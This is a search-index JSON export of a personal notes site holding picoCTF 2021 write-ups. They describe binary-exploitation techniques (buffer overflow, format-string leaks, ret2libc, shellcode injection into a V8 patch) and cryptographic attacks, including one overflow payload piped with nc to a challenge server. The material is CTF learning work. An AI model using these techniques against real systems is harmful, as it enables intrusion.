{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Indroduction \u00b6 Here are my public notes taken that covers a bunch of stuff I write about. You can find my freewrites, reviews, journals, writeups, tutorials blah blah...","title":"Indroduction"},{"location":"#indroduction","text":"Here are my public notes taken that covers a bunch of stuff I write about. You can find my freewrites, reviews, journals, writeups, tutorials blah blah...","title":"Indroduction"},{"location":"CTF%20Writeups/","text":"Introduction \u00b6 Here are all my Capture the Flag(CTF) competition writeups. You can find the full script and resources to the writeups in my GitHub Repository .","title":"Introduction"},{"location":"CTF%20Writeups/#introduction","text":"Here are all my Capture the Flag(CTF) competition writeups. You can find the full script and resources to the writeups in my GitHub Repository .","title":"Introduction"},{"location":"CTF%20Writeups/Protostar/","text":"Pheonix Protostar Binaries \u00b6 Here are my writeups and scripts for the Pheonix Protostar Binary Exploit practices. You can access the exercises and source files here .","title":"Pheonix Protostar Binaries"},{"location":"CTF%20Writeups/Protostar/#pheonix-protostar-binaries","text":"Here are my writeups and scripts for the Pheonix Protostar Binary Exploit practices. You can access the exercises and source files here .","title":"Pheonix Protostar Binaries"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/","text":"","title":"Index"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_0/","text":"Binary Gauntlet 0 \u00b6 the source code after some reverse engineering and code flow analysis int main ( void ) { char local_88 [ 108 ]; __gid_t local_1c ; FILE * flag_file ; char * our_input ; our_input = ( char * ) malloc ( 1000 ); flag_file = fopen ( \"flag.txt\" , \"r\" ); if ( flag_file == ( FILE * ) 0x0 ) { puts ( \"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server.\" ); /* WARNING: Subroutine does not return */ exit ( 0 ); } fgets ( flag , 0x40 , flag_file ); signal ( 0xb , sigsegv_handler ); local_1c = getegid (); setresgid ( local_1c , local_1c , local_1c ); fgets ( our_input , 1000 , stdin ); our_input [ 999 ] = '\\0' ; printf ( our_input ); fflush ( stdout ); fgets ( our_input , 1000 , stdin ); our_input [ 999 ] = '\\0' ; strcpy ( local_88 , our_input ); return 0 ; } Notice the signal() function. It calls the sigsegv_handler on each SIGSEGV error(buffer overflow? heap overflow?) sigsegv_handler \u00b6 so it basically prints the flag void sigsegv_handler ( void ) { fprintf ( stderr , \"%s \\n \" , flag ); fflush ( stderr ); /* WARNING: Subroutine does not return */ exit ( 1 ); } we need so somehow trigger a segmetation fault Flag \u00b6 Simply heap overflow it by pushing in a lot of characters Payload \u00b6 python3 -c \"print('A'*3000)\" | nc mercury.picoctf.net 48515 b8f7e81f00cc0618503136fbacaf5d4c","title":"Binary Gauntlet 0"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_0/#binary-gauntlet-0","text":"the source code after some reverse engineering and code flow analysis int main ( void ) { char local_88 [ 108 ]; __gid_t local_1c ; FILE * flag_file ; char * our_input ; our_input = ( char * ) malloc ( 1000 ); flag_file = fopen ( \"flag.txt\" , \"r\" ); if ( flag_file == ( FILE * ) 0x0 ) { puts ( \"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server.\" ); /* WARNING: Subroutine does not return */ exit ( 0 ); } fgets ( flag , 0x40 , flag_file ); signal ( 0xb , sigsegv_handler ); local_1c = getegid (); setresgid ( local_1c , local_1c , local_1c ); fgets ( our_input , 1000 , stdin ); our_input [ 999 ] = '\\0' ; printf ( our_input ); fflush ( stdout ); fgets ( our_input , 1000 , stdin ); our_input [ 999 ] = '\\0' ; strcpy ( local_88 , our_input ); return 0 ; } Notice the signal() function. It calls the sigsegv_handler on each SIGSEGV error(buffer overflow? heap overflow?)","title":"Binary Gauntlet 0"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_0/#sigsegv_handler","text":"so it basically prints the flag void sigsegv_handler ( void ) { fprintf ( stderr , \"%s \\n \" , flag ); fflush ( stderr ); /* WARNING: Subroutine does not return */ exit ( 1 ); } we need so somehow trigger a segmetation fault","title":"sigsegv_handler"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_0/#flag","text":"Simply heap overflow it by pushing in a lot of characters","title":"Flag"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_0/#payload","text":"python3 -c \"print('A'*3000)\" | nc mercury.picoctf.net 48515 b8f7e81f00cc0618503136fbacaf5d4c","title":"Payload"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_1/","text":"Binary Gauntlet 1 \u00b6 Throwing the program into Ghidra we can see the decompiled main function. It's functionality is quite simple. By running the binary, we see that it prints out a hex value and looking at the source, we see that it's actually an address for a variable we use later. Then the program expects 2 inputs and we see that we are able to overflow to RAX and due the the strcpy() function, we will inject shellcode to the address leaked in the first line. Method \u00b6 Using pwntools we can easily assemble the shellcode but we need to determine the offset to overwrite RAX. Using the pwn cyclic tool we can generate a piece of string as input and use GDB to find the correct offset. After that, we just need to remove the length of the shellcode from the buffer and send that off to the binary.","title":"Binary Gauntlet 1"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_1/#binary-gauntlet-1","text":"Throwing the program into Ghidra we can see the decompiled main function. It's functionality is quite simple. By running the binary, we see that it prints out a hex value and looking at the source, we see that it's actually an address for a variable we use later. Then the program expects 2 inputs and we see that we are able to overflow to RAX and due the the strcpy() function, we will inject shellcode to the address leaked in the first line.","title":"Binary Gauntlet 1"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_1/#method","text":"Using pwntools we can easily assemble the shellcode but we need to determine the offset to overwrite RAX. Using the pwn cyclic tool we can generate a piece of string as input and use GDB to find the correct offset. After that, we just need to remove the length of the shellcode from the buffer and send that off to the binary.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_2/","text":"Binary Gauntlet 2 \u00b6 This challenge is very similar to the previous but it doesn't give you the address of the variable to inject shellcode anymore. In this case a printf vulnerability could be used for the first input to leak the address of that variable on the stack then we could do the same exploit as the previous challenge. Method \u00b6 To leak addresses on the stack we ues %p as a decorator. By experimenting with the binary and some GDB debugging, I found that the variable at %6$p is the correct address.","title":"Binary Gauntlet 2"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_2/#binary-gauntlet-2","text":"This challenge is very similar to the previous but it doesn't give you the address of the variable to inject shellcode anymore. In this case a printf vulnerability could be used for the first input to leak the address of that variable on the stack then we could do the same exploit as the previous challenge.","title":"Binary Gauntlet 2"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_2/#method","text":"To leak addresses on the stack we ues %p as a decorator. By experimenting with the binary and some GDB debugging, I found that the variable at %6$p is the correct address.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_3/","text":"Binary Gauntlet 3 \u00b6 Notes \u00b6 This one is probably a libc one. leaked base address: leak - 0x21bf7 One gadget used to pop shell","title":"Binary Gauntlet 3"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_3/#binary-gauntlet-3","text":"","title":"Binary Gauntlet 3"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/binary_gauntlet_3/#notes","text":"This one is probably a libc one. leaked base address: leak - 0x21bf7 One gadget used to pop shell","title":"Notes"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/cache_me_outside/","text":"","title":"Cache me outside"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/filtered_shellcode/","text":"","title":"Filtered shellcode"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/kit_engine/","text":"Kit Engine \u00b6 This is a V8 engine challenge and the key observation is the patch file that is used to compile the engine. Looking at the patch file in the source, we see a function called AssembleEngine . This is a function that we could call and looking at it, we see that it basically takes in an array of floating point numbers and runs it as a function. void Shell::AssembleEngine ( const v8 :: FunctionCallbackInfo < v8 :: Value > & args ) { Isolate * isolate = args . GetIsolate (); if ( args . Length () != 1 ) { return ; } double * func = ( double * ) mmap ( NULL , 4096 , PROT_READ | PROT_WRITE | PROT_EXEC , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( func == ( double * ) -1 ) { printf ( \"Unable to allocate memory. Contact admin \\n \" ); return ; } if ( args [ 0 ] -> IsArray ()) { Local < Array > arr = args [ 0 ]. As < Array > (); Local < Value > element ; for ( uint32_t i = 0 ; i < arr -> Length (); i ++ ) { if ( arr -> Get ( isolate -> GetCurrentContext (), i ). ToLocal ( & element ) && element -> IsNumber ()) { Local < Number > val = element . As < Number > (); func [ i ] = val -> Value (); } } printf ( \"Memory Dump. Watch your endianness!!: \\n \" ); for ( uint32_t i = 0 ; i < arr -> Length (); i ++ ) { printf ( \"%d: float %f hex %lx \\n \" , i , func [ i ], doubleToUint64_t ( func [ i ])); } printf ( \"Starting your engine!! \\n \" ); void ( * foo )() = ( void ( * )()) func ; foo (); } printf ( \"Done \\n \" ); } Method \u00b6 Now, we just need to inject some shellcode into it by converting into a floating point. pwntools shellcraft lets us do that very easily. After converting it into floats and doing some manipulation to get rid of edge cases, we just need to connect to the remote and let pwntools do the job. Finally, we will need an interactive shell, so by calling bash 1>&0 2>&0 we get a shell. Technically, we could cat flag.txt but somehow it segfaults.","title":"Kit Engine"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/kit_engine/#kit-engine","text":"This is a V8 engine challenge and the key observation is the patch file that is used to compile the engine. Looking at the patch file in the source, we see a function called AssembleEngine . This is a function that we could call and looking at it, we see that it basically takes in an array of floating point numbers and runs it as a function. void Shell::AssembleEngine ( const v8 :: FunctionCallbackInfo < v8 :: Value > & args ) { Isolate * isolate = args . GetIsolate (); if ( args . Length () != 1 ) { return ; } double * func = ( double * ) mmap ( NULL , 4096 , PROT_READ | PROT_WRITE | PROT_EXEC , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( func == ( double * ) -1 ) { printf ( \"Unable to allocate memory. Contact admin \\n \" ); return ; } if ( args [ 0 ] -> IsArray ()) { Local < Array > arr = args [ 0 ]. As < Array > (); Local < Value > element ; for ( uint32_t i = 0 ; i < arr -> Length (); i ++ ) { if ( arr -> Get ( isolate -> GetCurrentContext (), i ). ToLocal ( & element ) && element -> IsNumber ()) { Local < Number > val = element . As < Number > (); func [ i ] = val -> Value (); } } printf ( \"Memory Dump. Watch your endianness!!: \\n \" ); for ( uint32_t i = 0 ; i < arr -> Length (); i ++ ) { printf ( \"%d: float %f hex %lx \\n \" , i , func [ i ], doubleToUint64_t ( func [ i ])); } printf ( \"Starting your engine!! \\n \" ); void ( * foo )() = ( void ( * )()) func ; foo (); } printf ( \"Done \\n \" ); }","title":"Kit Engine"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/kit_engine/#method","text":"Now, we just need to inject some shellcode into it by converting into a floating point. pwntools shellcraft lets us do that very easily. After converting it into floats and doing some manipulation to get rid of edge cases, we just need to connect to the remote and let pwntools do the job. Finally, we will need an interactive shell, so by calling bash 1>&0 2>&0 we get a shell. Technically, we could cat flag.txt but somehow it segfaults.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/libc/","text":"Here's a libc \u00b6 This is a classic ret2libc challenge and I have a script to handle it. We just need to find the offset and calculate stack alignment using the leaked puts address. Method \u00b6 Using GDB peda and pwn cyclic we can easily find the offset of 136 . Then by calling puts on puts we leak the address of it. Comparing it to the provided libc.so.6 location of puts we can calculate the base address of libc. The we just need to assemble a ROP chain that calls one gadget which pops a shell for us.","title":"Here's a libc"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/libc/#heres-a-libc","text":"This is a classic ret2libc challenge and I have a script to handle it. We just need to find the offset and calculate stack alignment using the leaked puts address.","title":"Here's a libc"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/libc/#method","text":"Using GDB peda and pwn cyclic we can easily find the offset of 136 . Then by calling puts on puts we leak the address of it. Comparing it to the provided libc.so.6 location of puts we can calculate the base address of libc. The we just need to assemble a ROP chain that calls one gadget which pops a shell for us.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/stonks/","text":"Stonks \u00b6 This challenges exploits the printf vulnerability. We can leak values from the stack by using decorators such as %x which prints reverse hex values. Method \u00b6 In a for loop, loop through the positions on the stack and check whether the leaked data is printable characters. If so, it will be added to the output flag.","title":"Stonks"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/stonks/#stonks","text":"This challenges exploits the printf vulnerability. We can leak values from the stack by using decorators such as %x which prints reverse hex values.","title":"Stonks"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/stonks/#method","text":"In a for loop, loop through the positions on the stack and check whether the leaked data is printable characters. If so, it will be added to the output flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/unsubscriptions_are_free/","text":"Unsubscriptions are Free \u00b6","title":"Unsubscriptions are Free"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/unsubscriptions_are_free/#unsubscriptions-are-free","text":"","title":"Unsubscriptions are Free"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/whats_your_input/","text":"Whats your Input \u00b6 This is a python2 input vuln. We know that python2 input is basically eval(raw_input(prompt)) Method \u00b6 For the second user input, just type city since we know that it will evaluated to whatever randm city it chose and thus printing the flag.","title":"Whats your Input"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/whats_your_input/#whats-your-input","text":"This is a python2 input vuln. We know that python2 input is basically eval(raw_input(prompt))","title":"Whats your Input"},{"location":"CTF%20Writeups/picoCTF%202021/Binary%20Exploitation/whats_your_input/#method","text":"For the second user input, just type city since we know that it will evaluated to whatever randm city it chose and thus printing the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/README%209.51.32%20PM/","text":"Cryptography \u00b6 Cryptography challenges. Was able to complete all challenges except clouds","title":"Cryptography"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/README%209.51.32%20PM/#cryptography","text":"Cryptography challenges. Was able to complete all challenges except clouds","title":"Cryptography"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/clouds/","text":"","title":"Clouds"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/compress_and_attack/","text":"Compress and Attack \u00b6","title":"Compress and Attack"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/compress_and_attack/#compress-and-attack","text":"","title":"Compress and Attack"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/double_des/","text":"Double DES \u00b6 This is a meet in the middle attack on DES. The program allows us to encrypt arbitrary data in which it returns the encrypted data after double DES encryption. Intuition \u00b6 The intuition here is that we know the key size is not that large since the key is only 6 characters long we could simply try every possible key on the input as well as the output. Anything that matches means that this pair of keys is the correct one. Method \u00b6 Initially, I though that we would need many input interactions to narrow it down to a reasonable dictionary size but after only 1 character A there were only around 64 valid key pairs left. I just brute forced the flag and it seems like all 64 pairs work to decrypt the ciphertext given.","title":"Double DES"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/double_des/#double-des","text":"This is a meet in the middle attack on DES. The program allows us to encrypt arbitrary data in which it returns the encrypted data after double DES encryption.","title":"Double DES"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/double_des/#intuition","text":"The intuition here is that we know the key size is not that large since the key is only 6 characters long we could simply try every possible key on the input as well as the output. Anything that matches means that this pair of keys is the correct one.","title":"Intuition"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/double_des/#method","text":"Initially, I though that we would need many input interactions to narrow it down to a reasonable dictionary size but after only 1 character A there were only around 64 valid key pairs left. I just brute forced the flag and it seems like all 64 pairs work to decrypt the ciphertext given.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/easy_peasy/","text":"Easy Peasy \u00b6 This challenge is vulnerable due to it's OTP generation algorithm. Taking a closer look at the source we see that after a certain amount of characters inputted, we are able to cycle back to the beginning of the start of the key thus leaking it. Method \u00b6 The important observation is here if stop >= KEY_LEN : stop = stop % KEY_LEN we see that if our user input is greater than the KEY_LEN variable, we will be able to redefine the starting point of the next encryption. If we make sure that we input the same amount of characters up till the KEY_LEN we can cycle back to 0. I tried to send the buffer all at once to overflow it back to 0, but the terminal couldn't handle it thus I split it up into chunks of 4000 or 2000 characters and encrypted it using 65 which is A . This means that after I overflow back to 0, I just need to leak the first 32 characters of the flag with our known key A and XOR decrypt it programmatically. Notes \u00b6 Encrypted 5541103a246e415e036c4c5f0e3d415a513e4a560050644859536b4f57003d4c Flag_length = 32 leaked bytes 2366681f041d3979761d3927761d3923741d392571221d3979271d3922771d39 2020202023202020222020202520202024202020272020202620202029202020","title":"Easy Peasy"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/easy_peasy/#easy-peasy","text":"This challenge is vulnerable due to it's OTP generation algorithm. Taking a closer look at the source we see that after a certain amount of characters inputted, we are able to cycle back to the beginning of the start of the key thus leaking it.","title":"Easy Peasy"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/easy_peasy/#method","text":"The important observation is here if stop >= KEY_LEN : stop = stop % KEY_LEN we see that if our user input is greater than the KEY_LEN variable, we will be able to redefine the starting point of the next encryption. If we make sure that we input the same amount of characters up till the KEY_LEN we can cycle back to 0. I tried to send the buffer all at once to overflow it back to 0, but the terminal couldn't handle it thus I split it up into chunks of 4000 or 2000 characters and encrypted it using 65 which is A . This means that after I overflow back to 0, I just need to leak the first 32 characters of the flag with our known key A and XOR decrypt it programmatically.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/easy_peasy/#notes","text":"Encrypted 5541103a246e415e036c4c5f0e3d415a513e4a560050644859536b4f57003d4c Flag_length = 32 leaked bytes 2366681f041d3979761d3927761d3923741d392571221d3979271d3922771d39 2020202023202020222020202520202024202020272020202620202029202020","title":"Notes"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/it_is_my_birthday/","text":"It is my birthday \u00b6 This challenge is regarding a SHA-1 collision on PDF documents. Looking at the hint shattered.io we see that it is possible for 2 different PDF files to have identical SHA1 hashes. But for this challenge, it has to have the same last 1000 bytes as the original invite. Method \u00b6 To solve this challenge, I first found 2 SHA1 colliding PDF from the internet(you can use a generator or even the provided example from shattered.io). Looking at it's raw bytes in hexedit we can clearly differentiate the header the content and the footer data. By testing around, I realized that the raw data and the footer in my 2 files are identical. Theoretically, If I remove them, the file should still be SHA1 collided because I just remove the same data from both files. In fact, that was the case and I just simply added the last 1000 bytes, which contains some data(mostly empty 00 bytes) and the footer, to the 2 PDF files. Because it was already SHA1 collided, we added the same data to both, it still remains a collision.","title":"It is my birthday"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/it_is_my_birthday/#it-is-my-birthday","text":"This challenge is regarding a SHA-1 collision on PDF documents. Looking at the hint shattered.io we see that it is possible for 2 different PDF files to have identical SHA1 hashes. But for this challenge, it has to have the same last 1000 bytes as the original invite.","title":"It is my birthday"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/it_is_my_birthday/#method","text":"To solve this challenge, I first found 2 SHA1 colliding PDF from the internet(you can use a generator or even the provided example from shattered.io). Looking at it's raw bytes in hexedit we can clearly differentiate the header the content and the footer data. By testing around, I realized that the raw data and the footer in my 2 files are identical. Theoretically, If I remove them, the file should still be SHA1 collided because I just remove the same data from both files. In fact, that was the case and I just simply added the last 1000 bytes, which contains some data(mostly empty 00 bytes) and the footer, to the 2 PDF files. Because it was already SHA1 collided, we added the same data to both, it still remains a collision.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/its_not_my_fault_1/","text":"It's Not My Fault 1 \u00b6 This is a Brute force attack on small secret CRT-Exponents and a great resource on this is at Bitsdeep . The setup of our challenge is very similar, almost identical to the provided example thus using such code I was able to brute force the flag within minuets.","title":"It's Not My Fault 1"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/its_not_my_fault_1/#its-not-my-fault-1","text":"This is a Brute force attack on small secret CRT-Exponents and a great resource on this is at Bitsdeep . The setup of our challenge is very similar, almost identical to the provided example thus using such code I was able to brute force the flag within minuets.","title":"It's Not My Fault 1"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/its_not_my_fault_2/","text":"It's Not My Fault 2 \u00b6","title":"It's Not My Fault 2"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/its_not_my_fault_2/#its-not-my-fault-2","text":"","title":"It's Not My Fault 2"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/mind_your_p_q/","text":"Mind Your P Q \u00b6 This one is a super straightforward RSA challenge with all the parameters given. I just threw it into RsaCtfTool which gave me the answer instantly.","title":"Mind Your P Q"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/mind_your_p_q/#mind-your-p-q","text":"This one is a super straightforward RSA challenge with all the parameters given. I just threw it into RsaCtfTool which gave me the answer instantly.","title":"Mind Your P Q"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/mini_rsa/","text":"Mini RSA \u00b6 This mini RSA question is not like previously seen ones where we could simply apply a cube root attack. Due to padding, m^e is actually larger than the public modulus. Method \u00b6 Although we cannot run a cube root attack, we do realize that e is only 3 and m^e is barely larger than n we could see brute force the plaintext by just trying to add the public modulus. RSA encryption uses : c = m^e mod n RSA decryption could use: p = (c+xn)^(1/e) Here, x is probably not so large so we can test that theory out. Initially, I used the decimal python module but the results were not accurate enough thus not giving me a flag. I move on to use a sage math kernel which handles numbers way better than python and it gave me the flag with ease.","title":"Mini RSA"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/mini_rsa/#mini-rsa","text":"This mini RSA question is not like previously seen ones where we could simply apply a cube root attack. Due to padding, m^e is actually larger than the public modulus.","title":"Mini RSA"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/mini_rsa/#method","text":"Although we cannot run a cube root attack, we do realize that e is only 3 and m^e is barely larger than n we could see brute force the plaintext by just trying to add the public modulus. RSA encryption uses : c = m^e mod n RSA decryption could use: p = (c+xn)^(1/e) Here, x is probably not so large so we can test that theory out. Initially, I used the decimal python module but the results were not accurate enough thus not giving me a flag. I move on to use a sage math kernel which handles numbers way better than python and it gave me the flag with ease.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_caesar/","text":"New Caesar \u00b6 I use a brute force script to complete the challenge due to the small alphabet size. Method \u00b6 Since the key of this cipher is only 1 character long and the flag is encrypted statically(each character is encrypted independently) we are able to simply try all keys and printable characters and see which one matches the desired output. By keeping a count of how many times the key worked, we know that only the the key that worked for all 39 characters in the flag is the real key thus giving us the output. Due to a small alphabet size, the script runs almost instantly.","title":"New Caesar"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_caesar/#new-caesar","text":"I use a brute force script to complete the challenge due to the small alphabet size.","title":"New Caesar"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_caesar/#method","text":"Since the key of this cipher is only 1 character long and the flag is encrypted statically(each character is encrypted independently) we are able to simply try all keys and printable characters and see which one matches the desired output. By keeping a count of how many times the key worked, we know that only the the key that worked for all 39 characters in the flag is the real key thus giving us the output. Due to a small alphabet size, the script runs almost instantly.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/","text":"New Vignere \u00b6 This is a new implementation of the Vignere cipher which involves the b16_encode . There is a couple of important aspects to notice and overcome in order to solve this challenge. Cryptographic Analysis \u00b6 Key Length \u00b6 Looking at the b16_encode function of the program, we can see an vulnerability that allows us to not only determine the key length, also the shift that's done to each key. If we encrypt all of the characters that could be in the potential flag abc0123456def789 we see that due to the b16_encode function cutting the 8 bit binary data into two pieces, the first part always stays rather consistent where all letters start with g and numbers start with d . This means no matter what the key is, which determines the shift, each encrypted chunk has a pattern of only consisting of no more than 2 distinct characters. Using the key_length script we test out all possible key lengths and redirect that into a text file to analyze and at a key length of 9 we see such pattern. lejjlnjmj ndkmjinki lbmlljjkm nakmmighh ocmllojhj maijpiohn lojmokjkj a Notice how the first column only has l and o on odd positions and the second column only has d and a on even positions? This exactly matches the original b_16 pattern and we have found our key length. Potential Key \u00b6 To find the potential key, we are able to continue on the vulnerabilyty on the b_16 function. Since the first column has l and o we need to find a common shift that makes these two characters into d and g . By collecting the characters from each column we get the following result: col1: 'l','o' col2: 'd','a' col3: 'j','m' col4: 'm','j' col5: 'l','o' col6: 'i' col7: 'j' col8: 'h','k' col9: 'j','m' Notice how some columns only have 1 character, that means it's either only digits( d ) or characters( g ) thus we need to try both. Looking at the shift algorithm implemented, we could easily reverse the operation knowing the output( d or g ) and 1 input. We do this for each column and by finding the intersection of the two letters, we find a common shift that satisfies both letters thus giving us the key. Final Step \u00b6 Now we have a list of potential keys, we just need to try each key on the ciphertext given then b16_decode , whichever decrypted output satisfies the flag format is the final flag.","title":"New Vignere"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/#new-vignere","text":"This is a new implementation of the Vignere cipher which involves the b16_encode . There is a couple of important aspects to notice and overcome in order to solve this challenge.","title":"New Vignere"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/#cryptographic-analysis","text":"","title":"Cryptographic Analysis"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/#key-length","text":"Looking at the b16_encode function of the program, we can see an vulnerability that allows us to not only determine the key length, also the shift that's done to each key. If we encrypt all of the characters that could be in the potential flag abc0123456def789 we see that due to the b16_encode function cutting the 8 bit binary data into two pieces, the first part always stays rather consistent where all letters start with g and numbers start with d . This means no matter what the key is, which determines the shift, each encrypted chunk has a pattern of only consisting of no more than 2 distinct characters. Using the key_length script we test out all possible key lengths and redirect that into a text file to analyze and at a key length of 9 we see such pattern. lejjlnjmj ndkmjinki lbmlljjkm nakmmighh ocmllojhj maijpiohn lojmokjkj a Notice how the first column only has l and o on odd positions and the second column only has d and a on even positions? This exactly matches the original b_16 pattern and we have found our key length.","title":"Key Length"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/#potential-key","text":"To find the potential key, we are able to continue on the vulnerabilyty on the b_16 function. Since the first column has l and o we need to find a common shift that makes these two characters into d and g . By collecting the characters from each column we get the following result: col1: 'l','o' col2: 'd','a' col3: 'j','m' col4: 'm','j' col5: 'l','o' col6: 'i' col7: 'j' col8: 'h','k' col9: 'j','m' Notice how some columns only have 1 character, that means it's either only digits( d ) or characters( g ) thus we need to try both. Looking at the shift algorithm implemented, we could easily reverse the operation knowing the output( d or g ) and 1 input. We do this for each column and by finding the intersection of the two letters, we find a common shift that satisfies both letters thus giving us the key.","title":"Potential Key"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/new_vignere/#final-step","text":"Now we have a list of potential keys, we just need to try each key on the ciphertext given then b16_decode , whichever decrypted output satisfies the flag format is the final flag.","title":"Final Step"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/no_padding_no_problem/","text":"No Padding No Problem \u00b6 Attacking RSA for fun and CTF points \u2013 part 1 The provided netcat connection gives the public modulus n and public exponent e as well as the ciphertext . This is also a Oracle because we can provide come ciphertext and the program will decrypt it for us. Reading Bitsdeep's article on RSA Oracle, we could multiply the ciphertext my another cipher text c2 which me know the plain text of and recover the decrypted c1 ciphertext. Heres how the math works: C = c*c_2 = M^e*2^e = 2M^e . So we just need to divide the returned plaintext by 2 to get the deciphered flag. Script \u00b6 Using pwntools we could easily store and manipulate given data as well as enter data to the nc connection.","title":"No Padding No Problem"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/no_padding_no_problem/#no-padding-no-problem","text":"Attacking RSA for fun and CTF points \u2013 part 1 The provided netcat connection gives the public modulus n and public exponent e as well as the ciphertext . This is also a Oracle because we can provide come ciphertext and the program will decrypt it for us. Reading Bitsdeep's article on RSA Oracle, we could multiply the ciphertext my another cipher text c2 which me know the plain text of and recover the decrypted c1 ciphertext. Heres how the math works: C = c*c_2 = M^e*2^e = 2M^e . So we just need to divide the returned plaintext by 2 to get the deciphered flag.","title":"No Padding No Problem"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/no_padding_no_problem/#script","text":"Using pwntools we could easily store and manipulate given data as well as enter data to the nc connection.","title":"Script"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/play_nice/","text":"Play Nice \u00b6 I've use a brute-force approach to solve this problem, but I'm sure there is an intended way to solve it. Method \u00b6 The mechanism encryptes messages statically, that means that if I encrypted the character a , the output will always be the same. If the input length is odd, it will add l as padding but the encrypted flag seems to map to an even number. This means that a certain combination of 2 letters will always result in the desired letters in the ciphertext. Script \u00b6 I used a nested for loop to iterate through all 2 letter combinations and encrypt that using the algorithm. If it matches the corresponding chunk on the ciphertext, we found the original characters, which we could use to build up the flag.","title":"Play Nice"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/play_nice/#play-nice","text":"I've use a brute-force approach to solve this problem, but I'm sure there is an intended way to solve it.","title":"Play Nice"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/play_nice/#method","text":"The mechanism encryptes messages statically, that means that if I encrypted the character a , the output will always be the same. If the input length is odd, it will add l as padding but the encrypted flag seems to map to an even number. This means that a certain combination of 2 letters will always result in the desired letters in the ciphertext.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/play_nice/#script","text":"I used a nested for loop to iterate through all 2 letter combinations and encrypt that using the algorithm. If it matches the corresponding chunk on the ciphertext, we found the original characters, which we 